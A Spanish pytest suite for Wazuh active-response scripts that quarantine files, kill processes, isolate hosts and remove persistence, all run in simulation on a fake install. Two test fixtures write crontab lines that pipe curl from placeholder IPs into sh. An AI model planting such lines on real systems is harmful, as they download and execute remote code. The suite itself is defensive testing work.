"""
Scripts de active response de Wazuh: responselab_ar.py (Linux) y
responselab_ar.ps1 (Windows), con sus lanzadores.

Los de Linux se ejecutan de verdad, como los ejecutaria wazuh-execd: una linea
JSON por stdin, la respuesta a check_keys y el acuse en
<wazuh>/logs/active-responses.log. Siempre en simulacion (RL_AR_SIMULACION=1)
y sobre una instalacion de Wazuh falsa dentro de tmp_path. Ninguna prueba
mueve, copia ni borra un fichero del sistema: los casos que deben rechazarse
llevan ademas un sha256 que no casa, para que un fallo de la proteccion se
quede en un rechazo por contenido y no en un fichero del sistema movido.
"""
from __future__ import annotations

import importlib.util
import json
import os
import re
import shutil
import stat
import subprocess
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

RAIZ = Path(__file__).resolve().parent.parent
AR = RAIZ / "siem" / "wazuh" / "active-response"
AR_LINUX = AR / "linux"
AR_WINDOWS = AR / "windows"
SCRIPT_LINUX = AR_LINUX / "responselab_ar.py"
SCRIPT_PS1 = AR_WINDOWS / "responselab_ar.ps1"
PWSH = Path("/opt/pwsh/pwsh") if Path("/opt/pwsh/pwsh").exists() else (Path(shutil.which("pwsh")) if shutil.which("pwsh") else None)
LANZADORES_LINUX = sorted(p.name for p in AR_LINUX.glob("responselab-*"))
LANZADORES_WINDOWS = sorted(p.name for p in AR_WINDOWS.glob("responselab-*.cmd"))
ACCIONES = sorted(n[len("responselab-"):] for n in LANZADORES_LINUX)
SHA_FALSO = "0" * 64
INTERPRETES_LANZADOR = ("/usr/bin/python3", "/usr/local/bin/python3", "/usr/libexec/platform-python", "/bin/python3")
CLAVE_SSH = "AAAAC3NzaC1lZDI1NTE5AAAAIK" + "x" * 44


# === Utilidades ==============================================================

def _entorno_base() -> dict:
    """Entorno limpio: sin variables RL_ heredadas ni proxies."""
    env = {k: v for k, v in os.environ.items()
           if not k.startswith("RL_") and k.lower() not in ("http_proxy", "https_proxy", "all_proxy")}
    env["NO_PROXY"] = env["no_proxy"] = "*"
    return env


def mensaje_execd(parametros, comando: str = "add", accion: str = "aislar") -> dict:
    return {"version": 1, "origin": {"name": "node01", "module": "wazuh-execd"}, "command": comando,
            "parameters": {"extra_args": [], "alert": {"data": {"responselab": parametros}},
                           "program": f"active-response/bin/responselab-{accion}"}}


def respuesta_execd(comando: str) -> dict:
    return {"version": 1, "origin": {"name": "node01", "module": "wazuh-execd"}, "command": comando, "parameters": {}}


def leer_acuses(fichero: Path) -> list[dict]:
    if not fichero.exists():
        return []
    salida = []
    for linea in fichero.read_text(encoding="utf-8").splitlines():
        if not linea.strip():
            continue
        cuerpo = json.loads(linea)["responselab_ar"]
        if isinstance(cuerpo.get("datos"), str):
            cuerpo["datos"] = json.loads(cuerpo["datos"])
        salida.append(cuerpo)
    return salida


class Resultado:
    def __init__(self, proceso: subprocess.CompletedProcess, acuses: list[dict]):
        self.codigo = proceso.returncode
        self.stdout = proceso.stdout
        self.stderr = proceso.stderr
        self.salida = [json.loads(x) for x in proceso.stdout.splitlines() if x.strip()]
        self.acuses = acuses

    @property
    def acuse(self) -> dict:
        assert len(self.acuses) == 1, f"se esperaba un acuse y hay {len(self.acuses)}: {self.acuses} / {self.stderr}"
        return self.acuses[0]


@pytest.fixture
def wazuh(tmp_path) -> Path:
    """Instalacion falsa de un agente Wazuh: active-response/bin con los lanzadores y el script."""
    base = tmp_path / "ossec"
    binarios = base / "active-response" / "bin"
    binarios.mkdir(parents=True)
    for f in AR_LINUX.iterdir():
        if f.is_file():
            shutil.copy2(f, binarios / f.name)
            os.chmod(binarios / f.name, 0o750)   # lo que hace el instalador
    (base / "logs").mkdir()
    (base / "etc").mkdir()
    return base


def ejecutar_ar(wazuh: Path, accion: str, parametros, respuesta: str | None = "continue", comando: str = "add",
                env: dict | None = None, con_lanzador: bool = True, wazuh_por_entorno: bool = True) -> Resultado:
    """Lanza la accion como wazuh-execd: orden por stdin y respuesta a check_keys."""
    entrada = json.dumps(mensaje_execd(parametros, comando, accion)) + "\n"
    if respuesta is not None:
        entrada += json.dumps(respuesta_execd(respuesta)) + "\n"
    entorno = _entorno_base()
    entorno["RL_AR_SIMULACION"] = "1"
    if wazuh_por_entorno:
        entorno["RL_WAZUH_DIR"] = str(wazuh)
    entorno.update(env or {})
    binarios = wazuh / "active-response" / "bin"
    if con_lanzador:
        if not any(os.access(p, os.X_OK) for p in INTERPRETES_LANZADOR):
            pytest.skip("el lanzador busca python3 en rutas del sistema que este equipo no tiene")
        cmd = [str(binarios / f"responselab-{accion}")]
    else:
        cmd = [sys.executable, str(binarios / "responselab_ar.py"), accion]
    proceso = subprocess.run(cmd, input=entrada, capture_output=True, text=True, env=entorno, timeout=60)
    return Resultado(proceso, leer_acuses(wazuh / "logs" / "active-responses.log"))


def cargar_modulo_ar(monkeypatch, wazuh: Path):
    """El script como modulo, apuntando a la instalacion falsa (para lo que no se puede probar sin riesgo)."""
    monkeypatch.setenv("RL_WAZUH_DIR", str(wazuh))
    monkeypatch.setenv("RL_AR_SIMULACION", "1")
    monkeypatch.setattr(sys, "dont_write_bytecode", True)    # nada de __pycache__ junto al script
    spec = importlib.util.spec_from_file_location(f"responselab_ar_{uuid.uuid4().hex}", SCRIPT_LINUX)
    modulo = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(modulo)
    return modulo


def sha256_de(ruta: Path) -> str:
    import hashlib
    return hashlib.sha256(ruta.read_bytes()).hexdigest()


def arranque_proceso(pid: int) -> float:
    """Hora de arranque segun /proc (la que traeria la alerta del sensor)."""
    texto = Path(f"/proc/{pid}/stat").read_text()
    campos = texto[texto.rindex(")") + 2:].split()
    btime = next(int(x.split()[1]) for x in Path("/proc/stat").read_text().splitlines() if x.startswith("btime "))
    return btime + int(campos[19]) / os.sysconf("SC_CLK_TCK")


def utc(epoch: float) -> str:
    return datetime.fromtimestamp(epoch, timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")


@pytest.fixture
def proceso_victima():
    """Un proceso propio y vivo sobre el que probar 'matar' (en simulacion no se mata)."""
    if not Path("/proc/self/stat").exists():
        pytest.skip("sin /proc: 'matar' solo se puede probar en Linux")
    p = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(120)"])
    try:
        yield p
    finally:
        p.kill()
        p.wait(timeout=10)


# === Lanzadores ==============================================================

def test_hay_14_lanzadores_linux_iguales_y_el_instalador_los_hace_ejecutables():
    """El permiso de ejecucion lo pone instalar-agente-linux.sh, no el repositorio:
    un repositorio subido desde la web de GitHub o desde Windows lo pierde."""
    assert len(LANZADORES_LINUX) == 14
    contenidos = {(AR_LINUX / n).read_bytes() for n in LANZADORES_LINUX}
    assert len(contenidos) == 1, "todos los lanzadores deben ser el mismo fichero: la accion sale del nombre"
    texto = contenidos.pop().decode("ascii")
    assert texto.startswith("#!/bin/sh\n")
    assert "\r" not in texto
    assert 'ACCION=$(basename "$0")' in texto and "ACCION=${ACCION#responselab-}" in texto
    instalador = (AR_LINUX.parent.parent / "instalar-agente-linux.sh").read_text(encoding="utf-8")
    assert 'chmod 750 "$BIN/$(basename "$f")"' in instalador


def test_cada_lanzador_es_una_accion_del_script(monkeypatch, wazuh):
    ar = cargar_modulo_ar(monkeypatch, wazuh)
    assert set(ACCIONES) == set(ar.ACCIONES)


@pytest.mark.parametrize("accion", ACCIONES)
def test_el_lanzador_deriva_la_accion_de_su_nombre(wazuh, accion):
    """Cada lanzador llega al script con su accion: el protocolo empieza y execd la aborta."""
    r = ejecutar_ar(wazuh, accion, {"ejecucion_id": f"ej-{accion}"}, respuesta="abort")
    assert r.codigo == 0, r.stderr
    assert r.salida and r.salida[0]["origin"]["name"] == f"responselab-{accion}"
    assert r.acuse["accion"] == accion
    assert r.acuse["estado"] == "rechazada"


def test_sin_rl_wazuh_dir_usa_la_instalacion_del_propio_script(wazuh):
    r = ejecutar_ar(wazuh, "aislar", {"ejecucion_id": "ej-1", "permitidos": ["10.0.0.5"]}, wazuh_por_entorno=False)
    assert r.acuse["estado"] == "aplicada"
    assert (wazuh / "var" / "responselab" / "aislamiento.json").is_file()


def test_accion_desconocida_deja_acuse_fallido(wazuh):
    r = ejecutar_ar(wazuh, "formatear", {"ejecucion_id": "ej-1"}, con_lanzador=False)
    assert r.codigo == 1
    assert r.salida == [], "con una accion desconocida no debe ni empezar el protocolo"
    assert r.acuse["estado"] == "fallida" and "desconocida" in r.acuse["detalle"]


# === Protocolo de execd ======================================================

def test_protocolo_check_keys_continue_y_acuse(wazuh):
    r = ejecutar_ar(wazuh, "aislar", {"ejecucion_id": "ej-42", "permitidos": ["10.0.0.5"]})
    assert r.codigo == 0, r.stderr
    assert r.salida == [{"version": 1, "origin": {"name": "responselab-aislar", "module": "active-response"},
                         "command": "check_keys", "parameters": {"keys": ["ej-42"]}}]
    acuse = r.acuse
    assert acuse["v"] == 1 and acuse["accion"] == "aislar" and acuse["estado"] == "aplicada"
    assert acuse["ejecucion_id"] == "ej-42"
    assert acuse["equipo"]
    # Una linea JSON por acuse, ASCII, con la forma que decodifica la regla 109900
    linea = (wazuh / "logs" / "active-responses.log").read_text(encoding="utf-8").strip()
    assert linea.isascii() and "\n" not in linea
    assert set(json.loads(linea)) == {"responselab_ar"}


def test_check_keys_sin_ejecucion_usa_la_accion_como_clave(wazuh):
    r = ejecutar_ar(wazuh, "liberar", {})
    assert r.salida[0]["parameters"]["keys"] == ["liberar"]


def test_abort_no_ejecuta_nada(wazuh, tmp_path):
    victima = tmp_path / "malware.bin"
    victima.write_bytes(b"contenido malicioso")
    r = ejecutar_ar(wazuh, "cuarentena", {"ejecucion_id": "ej-7", "ruta": str(victima)}, respuesta="abort")
    assert r.codigo == 0
    assert r.acuse["estado"] == "rechazada"
    assert victima.read_bytes() == b"contenido malicioso"
    assert not (wazuh / "var" / "responselab" / "custodia").exists()


def test_delete_se_ignora(wazuh, tmp_path):
    victima = tmp_path / "malware.bin"
    victima.write_bytes(b"x")
    r = ejecutar_ar(wazuh, "cuarentena", {"ejecucion_id": "ej-8", "ruta": str(victima)}, respuesta=None, comando="delete")
    assert r.codigo == 0
    assert r.salida == [], "un delete no pide check_keys"
    assert r.acuses == []
    assert victima.exists()


def test_comando_de_execd_desconocido(wazuh):
    r = ejecutar_ar(wazuh, "aislar", {"ejecucion_id": "ej-9"}, respuesta=None, comando="restart")
    assert r.codigo == 1
    assert r.acuse["estado"] == "fallida" and "no reconocido" in r.acuse["detalle"]


def test_stdin_vacio(wazuh):
    entorno = _entorno_base() | {"RL_WAZUH_DIR": str(wazuh), "RL_AR_SIMULACION": "1"}
    p = subprocess.run([str(wazuh / "active-response" / "bin" / "responselab-aislar")], input="",
                       capture_output=True, text=True, env=entorno, timeout=60)
    assert p.returncode == 1
    acuse = leer_acuses(wazuh / "logs" / "active-responses.log")[0]
    assert acuse["estado"] == "fallida" and "stdin" in acuse["detalle"]


def test_parametros_que_no_son_un_objeto(wazuh):
    r = ejecutar_ar(wazuh, "aislar", ["no", "es", "un", "objeto"], respuesta=None)
    assert r.codigo == 1
    assert r.acuse["estado"] == "fallida" and "ausentes" in r.acuse["detalle"]


# === Aislamiento =============================================================

def test_aislar_y_liberar_en_simulacion_con_nftables(wazuh):
    (wazuh / "etc" / "ossec.conf").write_text(
        "<ossec_config><client><server><address>10.0.30.2</address></server></client></ossec_config>", encoding="utf-8")
    r = ejecutar_ar(wazuh, "aislar", {"ejecucion_id": "ej-1", "permitidos": ["10.0.30.20", "no-es-ip"]})
    assert r.acuse["estado"] == "aplicada", r.acuse
    datos = r.acuse["datos"]
    assert datos["metodo"] == "nftables"
    # el manager de ossec.conf siempre queda permitido: sin el, el aislamiento no se podria deshacer
    assert datos["permitidos"] == ["10.0.30.2", "10.0.30.20"]
    estado = json.loads((wazuh / "var" / "responselab" / "aislamiento.json").read_text(encoding="utf-8"))
    assert estado["metodo"] == "nftables" and estado["ejecucion"] == "ej-1"

    r = ejecutar_ar(wazuh, "liberar", {"ejecucion_id": "ej-2"})
    assert r.acuses[-1]["estado"] == "aplicada"
    assert r.acuses[-1]["datos"]["previo"]["permitidos"] == ["10.0.30.2", "10.0.30.20"]
    assert not (wazuh / "var" / "responselab" / "aislamiento.json").exists()


def test_aislar_con_iptables_si_no_hay_nft(wazuh):
    r = ejecutar_ar(wazuh, "aislar", {"ejecucion_id": "ej-1", "permitidos": ["10.0.30.20", "fd00::20"]},
                    env={"RL_AR_BINARIOS": "iptables,ip6tables"})
    assert r.acuse["estado"] == "aplicada"
    assert r.acuse["datos"]["metodo"] == "iptables"


def test_aislar_sin_ips_permitidas_se_niega(wazuh):
    r = ejecutar_ar(wazuh, "aislar", {"ejecucion_id": "ej-1"})
    assert r.codigo == 1
    assert r.acuse["estado"] == "fallida" and "sin IPs permitidas" in r.acuse["detalle"]
    assert not (wazuh / "var" / "responselab" / "aislamiento.json").exists()


def test_aislar_sin_cortafuegos_se_niega(wazuh):
    r = ejecutar_ar(wazuh, "aislar", {"ejecucion_id": "ej-1", "permitidos": ["10.0.30.20"]},
                    env={"RL_AR_BINARIOS": "ninguno"})
    assert r.acuse["estado"] == "fallida" and "ni nft ni iptables" in r.acuse["detalle"]


def test_reglas_nft_del_aislamiento(monkeypatch, wazuh):
    """Politica drop en entrada, salida y reenvio; solo lo, el manager y el motor."""
    ar = cargar_modulo_ar(monkeypatch, wazuh)
    reglas = ar._nft_aislar(["10.0.30.2", "fd00::2"])
    assert reglas.count("policy drop;") == 3
    assert 'iif "lo" accept' in reglas and 'oif "lo" accept' in reglas
    assert "ip saddr { 10.0.30.2 } accept" in reglas and "ip daddr { 10.0.30.2 } accept" in reglas
    assert "ip6 saddr { fd00::2 } accept" in reglas
    # Se reemplaza la tabla entera: dos aislamientos seguidos no acumulan reglas
    assert reglas.startswith("table inet responselab_aislamiento\ndelete table inet responselab_aislamiento\n")


# === Procesos ================================================================

def test_matar_rechaza_el_pid_1(wazuh):
    r = ejecutar_ar(wazuh, "matar", {"ejecucion_id": "ej-1", "pid": 1, "inicio": "2026-10-01 10:00:00"})
    assert r.acuse["estado"] == "fallida" and "protegido" in r.acuse["detalle"]


@pytest.mark.parametrize("pid", ["abc", None, ""])
def test_matar_rechaza_un_pid_no_valido(wazuh, pid):
    r = ejecutar_ar(wazuh, "matar", {"ejecucion_id": "ej-1", "pid": pid, "inicio": "2026-10-01 10:00:00"})
    assert r.acuse["estado"] == "fallida" and "PID no valido" in r.acuse["detalle"]


def test_matar_rechaza_un_proceso_que_ya_no_existe(wazuh):
    pid_max = int(Path("/proc/sys/kernel/pid_max").read_text()) if Path("/proc/sys/kernel/pid_max").exists() else 32768
    libre = next(p for p in range(pid_max - 1, 2, -1) if not Path(f"/proc/{p}").exists())
    r = ejecutar_ar(wazuh, "matar", {"ejecucion_id": "ej-1", "pid": libre, "inicio": "2026-10-01 10:00:00"})
    assert r.acuse["estado"] == "fallida" and "ya no existe" in r.acuse["detalle"]


def test_matar_rechaza_un_pid_reutilizado(wazuh, proceso_victima):
    pid = proceso_victima.pid
    otra_hora = utc(arranque_proceso(pid) - 3600)
    r = ejecutar_ar(wazuh, "matar", {"ejecucion_id": "ej-1", "pid": pid, "inicio": otra_hora})
    assert r.acuse["estado"] == "fallida" and "reutilizado" in r.acuse["detalle"]
    assert proceso_victima.poll() is None


def test_matar_rechaza_una_imagen_distinta(wazuh, proceso_victima):
    pid = proceso_victima.pid
    r = ejecutar_ar(wazuh, "matar", {"ejecucion_id": "ej-1", "pid": pid, "inicio": utc(arranque_proceso(pid)),
                                     "imagen": "/usr/bin/no-es-este-binario"})
    assert r.acuse["estado"] == "fallida" and "no se mata" in r.acuse["detalle"]
    assert proceso_victima.poll() is None


def test_matar_rechaza_una_hora_ilegible(wazuh, proceso_victima):
    r = ejecutar_ar(wazuh, "matar", {"ejecucion_id": "ej-1", "pid": proceso_victima.pid, "inicio": "ayer por la tarde"})
    assert r.acuse["estado"] == "fallida" and "ilegible" in r.acuse["detalle"]


def test_matar_en_simulacion_con_objetivo_correcto(wazuh, proceso_victima):
    pid = proceso_victima.pid
    exe = os.readlink(f"/proc/{pid}/exe")
    r = ejecutar_ar(wazuh, "matar", {"ejecucion_id": "ej-1", "pid": pid, "inicio": utc(arranque_proceso(pid)), "imagen": exe})
    assert r.acuse["estado"] == "aplicada", r.acuse
    assert r.acuse["datos"]["pid"] == pid and r.acuse["datos"]["exe"] == exe
    assert len(r.acuse["datos"]["sha256"]) == 64
    assert proceso_victima.poll() is None, "en simulacion no se mata nada"


def test_matar_acepta_la_hora_de_arranque_con_desfase_horario(wazuh, proceso_victima):
    pid = proceso_victima.pid
    madrid = timezone(timedelta(hours=2))
    inicio = datetime.fromtimestamp(arranque_proceso(pid), madrid).isoformat(timespec="microseconds")
    assert inicio.endswith("+02:00")
    r = ejecutar_ar(wazuh, "matar", {"ejecucion_id": "ej-1", "pid": pid, "inicio": inicio})
    assert r.acuse["estado"] == "aplicada", r.acuse["detalle"]


# === Ficheros: cuarentena y restauracion =====================================

RUTAS_SISTEMA = ["/bin/sh", "/usr/bin/env", "/etc/passwd", "/etc/hosts"]


@pytest.mark.parametrize("ruta", RUTAS_SISTEMA)
def test_cuarentena_rechaza_rutas_del_sistema(wazuh, ruta):
    if not Path(ruta).is_file():
        pytest.skip(f"{ruta} no existe en este equipo")
    antes = Path(ruta).stat()
    r = ejecutar_ar(wazuh, "cuarentena", {"ejecucion_id": "ej-1", "ruta": ruta, "sha256": SHA_FALSO})
    assert r.acuse["estado"] == "fallida"
    assert "sistema operativo" in r.acuse["detalle"], r.acuse["detalle"]
    assert Path(ruta).stat().st_ino == antes.st_ino


@pytest.mark.parametrize("forma", ["doble_barra", "directorio_enlazado"])
def test_cuarentena_rechaza_rutas_del_sistema_escritas_de_otra_forma(wazuh, tmp_path, forma):
    if not Path("/usr/bin/env").is_file():
        pytest.skip("/usr/bin/env no existe en este equipo")
    if forma == "doble_barra":
        ruta = "//usr/bin/env"
    else:
        (tmp_path / "enlace").symlink_to("/usr/bin")
        ruta = str(tmp_path / "enlace" / "env")
    # sha256 falso: si la proteccion falla, el rechazo es por contenido y /usr/bin/env no se mueve
    r = ejecutar_ar(wazuh, "cuarentena", {"ejecucion_id": "ej-1", "ruta": ruta, "sha256": SHA_FALSO})
    assert Path("/usr/bin/env").is_file()
    assert r.acuse["estado"] == "fallida"
    assert "sistema operativo" in r.acuse["detalle"], r.acuse["detalle"]


@pytest.mark.parametrize("caso", ["relativa", "inexistente", "enlace", "directorio", "vacia"])
def test_cuarentena_rechaza_objetivos_no_inequivocos(wazuh, tmp_path, caso):
    real = tmp_path / "real.bin"
    real.write_bytes(b"datos")
    rutas = {"relativa": "real.bin", "inexistente": str(tmp_path / "no-esta.bin"), "directorio": str(tmp_path), "vacia": ""}
    if caso == "enlace":
        (tmp_path / "enlace.bin").symlink_to(real)
        rutas["enlace"] = str(tmp_path / "enlace.bin")
    r = ejecutar_ar(wazuh, "cuarentena", {"ejecucion_id": "ej-1", "ruta": rutas[caso]})
    assert r.acuse["estado"] == "fallida"
    assert real.read_bytes() == b"datos"
    assert not (wazuh / "var" / "responselab" / "custodia").exists()


def test_cuarentena_rechaza_un_fichero_que_ha_cambiado(wazuh, tmp_path):
    victima = tmp_path / "malware.bin"
    victima.write_bytes(b"version nueva")
    r = ejecutar_ar(wazuh, "cuarentena", {"ejecucion_id": "ej-1", "ruta": str(victima), "sha256": SHA_FALSO})
    assert r.acuse["estado"] == "fallida" and "ha cambiado" in r.acuse["detalle"]
    assert victima.exists()


def test_cuarentena_y_restauracion_de_ida_y_vuelta(wazuh, tmp_path):
    victima = tmp_path / "descargas" / "factura.exe"
    victima.parent.mkdir()
    victima.write_bytes(b"MZ\x90\x00 contenido de prueba")
    os.chmod(victima, 0o640)
    sha = sha256_de(victima)

    r = ejecutar_ar(wazuh, "cuarentena", {"ejecucion_id": "ej-1", "ruta": str(victima), "sha256": sha.upper(), "caso": "C-1"})
    assert r.acuse["estado"] == "aplicada", r.acuse
    # Una carpeta por fichero: hash del contenido y de la ruta (dos copias
    # identicas en dos rutas no se pisan)
    carpetas = sorted((wazuh / "var" / "responselab" / "custodia").glob(sha + "-*"))
    assert len(carpetas) == 1
    custodia = carpetas[0]
    assert r.acuse["datos"] == {"custodia": str(custodia), "sha256": sha, "ruta": str(victima)}
    assert not victima.exists()
    guardado = custodia / "fichero"
    assert guardado.read_bytes() == b"MZ\x90\x00 contenido de prueba"
    assert stat.S_IMODE(guardado.stat().st_mode) == 0, "en custodia el fichero no se puede ejecutar ni leer"
    assert stat.S_IMODE((wazuh / "var" / "responselab" / "custodia").stat().st_mode) == 0o700
    meta = json.loads((custodia / "meta.json").read_text(encoding="utf-8"))
    assert meta["ruta"] == str(victima) and meta["sha256"] == sha and meta["modo"] == 0o640
    assert meta["ejecucion"] == "ej-1" and meta["caso"] == "C-1" and len(meta["md5"]) == 32

    r = ejecutar_ar(wazuh, "restaurar", {"ejecucion_id": "ej-2", "sha256": sha})
    assert r.acuses[-1]["estado"] == "aplicada", r.acuses[-1]
    assert victima.read_bytes() == b"MZ\x90\x00 contenido de prueba"
    assert stat.S_IMODE(victima.stat().st_mode) == 0o640
    meta = json.loads((custodia / "meta.json").read_text(encoding="utf-8"))
    assert meta.get("restaurado")


def test_restaurar_por_ruta_y_sin_sobrescribir(wazuh, tmp_path):
    victima = tmp_path / "script.sh"
    victima.write_text("echo hola\n", encoding="utf-8")
    assert ejecutar_ar(wazuh, "cuarentena", {"ejecucion_id": "ej-1", "ruta": str(victima)}).acuse["estado"] == "aplicada"
    victima.write_text("otro fichero en el mismo sitio\n", encoding="utf-8")
    r = ejecutar_ar(wazuh, "restaurar", {"ejecucion_id": "ej-2", "ruta": str(victima)})
    assert r.acuses[-1]["estado"] == "fallida" and "no se sobrescribe" in r.acuses[-1]["detalle"]
    assert victima.read_text(encoding="utf-8") == "otro fichero en el mismo sitio\n"
    victima.unlink()
    r = ejecutar_ar(wazuh, "restaurar", {"ejecucion_id": "ej-3", "ruta": str(victima)})
    assert r.acuses[-1]["estado"] == "aplicada"
    assert victima.read_text(encoding="utf-8") == "echo hola\n"


def test_restaurar_sin_nada_en_custodia(wazuh):
    r = ejecutar_ar(wazuh, "restaurar", {"ejecucion_id": "ej-1", "sha256": "a" * 64})
    assert r.acuse["estado"] == "fallida" and "no hay nada en custodia" in r.acuse["detalle"]


def test_cuarentena_de_dos_copias_identicas_se_restauran_las_dos(wazuh, tmp_path):
    copias = [tmp_path / "temp" / "upd.exe", tmp_path / "inicio" / "upd.exe"]
    for c in copias:
        c.parent.mkdir()
        c.write_bytes(b"el mismo binario")
    for n, c in enumerate(copias):
        assert ejecutar_ar(wazuh, "cuarentena", {"ejecucion_id": f"ej-{n}", "ruta": str(c)}).acuses[-1]["estado"] == "aplicada"
    for n, c in enumerate(copias):
        r = ejecutar_ar(wazuh, "restaurar", {"ejecucion_id": f"ej-r{n}", "ruta": str(c)})
        assert r.acuses[-1]["estado"] == "aplicada", r.acuses[-1]["detalle"]
    assert all(c.read_bytes() == b"el mismo binario" for c in copias)


# === Conservar ===============================================================

def test_conservar_rechaza_shadow(wazuh):
    if not Path("/etc/shadow").is_file():
        pytest.skip("/etc/shadow no existe en este equipo")
    r = ejecutar_ar(wazuh, "conservar", {"ejecucion_id": "ej-1", "ruta": "/etc/shadow"})
    assert r.acuse["estado"] == "fallida"
    assert "almacen de credenciales" in r.acuse["detalle"]
    assert not (wazuh / "var" / "responselab" / "custodia").exists()


def test_conservar_copia_sin_tocar_el_original(wazuh, tmp_path):
    crontab = tmp_path / "crontab"
    crontab.write_text("* * * * * root curl http://203.0.113.9/x | sh\n", encoding="utf-8")
    sha = sha256_de(crontab)
    r = ejecutar_ar(wazuh, "conservar", {"ejecucion_id": "ej-1", "ruta": str(crontab), "caso": "C-9"})
    assert r.acuse["estado"] == "aplicada", r.acuse
    copia = wazuh / "var" / "responselab" / "custodia" / "conservados" / sha / "fichero"
    assert r.acuse["datos"] == {"custodia": str(copia.parent), "sha256": sha}
    assert copia.read_bytes() == crontab.read_bytes()
    assert stat.S_IMODE(copia.stat().st_mode) == 0o400
    assert crontab.exists()
    meta = json.loads((copia.parent / "meta.json").read_text(encoding="utf-8"))
    assert meta["ruta"] == str(crontab) and meta["caso"] == "C-9"


def test_conservar_sin_fichero(wazuh, tmp_path):
    r = ejecutar_ar(wazuh, "conservar", {"ejecucion_id": "ej-1", "ruta": str(tmp_path / "no-esta")})
    assert r.acuse["estado"] == "fallida" and "no hay fichero" in r.acuse["detalle"]


@pytest.mark.parametrize("forma", ["doble_barra", "enlace"])
def test_conservar_rechaza_shadow_escrito_de_otra_forma(monkeypatch, wazuh, tmp_path, forma):
    """En proceso y sin copiar nada: la copia, el sha256 y el md5 son falsos."""
    if not Path("/etc/shadow").is_file():
        pytest.skip("/etc/shadow no existe en este equipo")
    ar = cargar_modulo_ar(monkeypatch, wazuh)
    copias = []

    def copia_falsa(origen, destino, *a, **k):
        copias.append(origen)
        Path(destino).write_text("copia simulada", encoding="utf-8")

    monkeypatch.setattr(ar.shutil, "copy2", copia_falsa)
    monkeypatch.setattr(ar, "sha256", lambda ruta: "f" * 64)
    monkeypatch.setattr(ar, "md5", lambda ruta: "f" * 32)
    if forma == "doble_barra":
        ruta = "//etc/shadow"
    else:
        (tmp_path / "parece-un-log").symlink_to("/etc/shadow")
        ruta = str(tmp_path / "parece-un-log")
    with pytest.raises(ar.Fallo, match="credenciales"):
        ar.conservar({"ruta": ruta})
    assert copias == []


# === Persistencia y claves SSH ===============================================

def test_persistencia_de_fichero_y_su_restauracion(wazuh, tmp_path):
    lanzador = tmp_path / "autostart" / "actualizador.desktop"
    lanzador.parent.mkdir()
    lanzador.write_text("[Desktop Entry]\nExec=/tmp/.x/upd\n", encoding="utf-8")
    os.chmod(lanzador, 0o644)
    r = ejecutar_ar(wazuh, "persistencia", {"ejecucion_id": "ej-1", "ruta": str(lanzador)})
    assert r.acuse["estado"] == "aplicada", r.acuse
    assert r.acuse["datos"]["tipo"] == "fichero"
    assert not lanzador.exists()
    assert (Path(r.acuse["datos"]["custodia"]) / "original").read_text(encoding="utf-8").startswith("[Desktop Entry]")

    r = ejecutar_ar(wazuh, "persistencia-restaurar", {"ejecucion_id": "ej-2", "ruta": str(lanzador)})
    assert r.acuses[-1]["estado"] == "aplicada", r.acuses[-1]
    assert lanzador.read_text(encoding="utf-8") == "[Desktop Entry]\nExec=/tmp/.x/upd\n"
    assert stat.S_IMODE(lanzador.stat().st_mode) == 0o644


def test_persistencia_no_retira_ficheros_del_sistema(wazuh, tmp_path, monkeypatch):
    """Un binario del sistema nunca se retira como 'persistencia', aunque lo diga la alerta.

    Se prueba con el script como modulo y un "sistema" falso en tmp_path: si la
    guarda fallara, una prueba con /usr/bin de verdad borraria un binario.
    """
    ar = cargar_modulo_ar(monkeypatch, wazuh)
    falso = tmp_path / "usr" / "bin" / "ls"
    falso.parent.mkdir(parents=True)
    falso.write_text("binario", encoding="utf-8")
    monkeypatch.setattr(ar, "RE_RUTA_SISTEMA", re.compile("^" + re.escape(str(tmp_path / "usr" / "bin")) + "/"))
    with pytest.raises(ar.Fallo, match="sistema operativo"):
        ar.persistencia({"ruta": str(falso)})
    assert falso.read_text(encoding="utf-8") == "binario"


def test_persistencia_no_borra_un_fichero_de_cron_entero(wazuh, tmp_path, monkeypatch):
    """/etc/crontab y /etc/cron.d/* llevan tareas legitimas: sin la linea maliciosa no se toca nada,
    y con ella solo se retira esa linea."""
    ar = cargar_modulo_ar(monkeypatch, wazuh)
    cron = tmp_path / "etc" / "cron.d" / "sistema"
    cron.parent.mkdir(parents=True)
    legitima = "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"
    maliciosa = "*/5 * * * * root curl -s http://198.51.100.9/x | sh\n"
    cron.write_text(legitima + maliciosa, encoding="utf-8")
    monkeypatch.setattr(ar, "DIRS_CRON", (str(tmp_path / "etc" / "cron"),))
    with pytest.raises(ar.Fallo, match="linea a linea"):
        ar.persistencia({"ruta": str(cron)})
    assert cron.read_text(encoding="utf-8") == legitima + maliciosa
    detalle, datos = ar.persistencia({"ruta": str(cron), "nombre": "198.51.100.9"})
    assert datos["tipo"] == "crontab" and "1 linea" in detalle
    assert cron.read_text(encoding="utf-8") == legitima


def test_persistencia_sin_ruta_ni_unidad(wazuh):
    r = ejecutar_ar(wazuh, "persistencia", {"ejecucion_id": "ej-1", "nombre": "no-es-una-unidad"})
    assert r.acuse["estado"] == "fallida" and "sin ruta" in r.acuse["detalle"]


def test_persistencia_restaurar_sin_copia(wazuh, tmp_path):
    r = ejecutar_ar(wazuh, "persistencia-restaurar", {"ejecucion_id": "ej-1", "ruta": str(tmp_path / "nada")})
    assert r.acuse["estado"] == "fallida" and "no hay copia" in r.acuse["detalle"]


def test_ssh_clave_retira_solo_la_clave_y_la_devuelve(wazuh, tmp_path):
    claves = tmp_path / "authorized_keys"
    legitima = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL" + "a" * 44 + " admin@soc\n"
    intrusa = f"ssh-ed25519 {CLAVE_SSH} atacante@kali\n"
    claves.write_text(legitima + intrusa, encoding="utf-8")
    r = ejecutar_ar(wazuh, "ssh-clave", {"ejecucion_id": "ej-1", "ruta": str(claves), "clave": f"ssh-ed25519 {CLAVE_SSH}"})
    assert r.acuse["estado"] == "aplicada", r.acuse
    assert r.acuse["datos"] == {"ruta": str(claves), "claves": 1}
    assert claves.read_text(encoding="utf-8") == legitima

    r = ejecutar_ar(wazuh, "ssh-clave-restaurar", {"ejecucion_id": "ej-2", "ruta": str(claves)})
    assert r.acuses[-1]["estado"] == "aplicada"
    assert claves.read_text(encoding="utf-8") == legitima + intrusa
